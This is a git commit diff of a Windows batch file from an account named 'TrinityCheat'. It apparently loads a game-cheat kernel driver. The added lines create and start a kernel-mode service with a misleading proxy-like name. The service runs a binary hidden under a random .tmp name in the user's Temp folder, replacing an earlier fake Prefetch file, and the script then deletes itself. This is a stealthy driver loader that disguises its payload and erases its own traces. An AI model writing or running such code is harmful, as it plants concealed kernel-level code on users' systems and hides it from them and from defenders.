b340150d095c97d19a380bb698c763591a814884
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2025-10-06 02:20:46 +0700

    Update 7.bat

--- 7.bat
+++ 7.bat
@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create AutoHttpWinProxySvc1059_c binpath=C:\Windows\Prefetch\UPDATE.EXE-85KZT36B.pf type=kernel
-sc start AutoHttpWinProxySvc1059_c
+sc create AutoHttpWinProxySvc6374_c binpath=C:\Users\%username%\AppData\Local\Temp\39de3374-aa2c-4a91-97ae-b356c3d94216.tmp type=kernel
+sc start AutoHttpWinProxySvc6374_c
 del "%~f0"
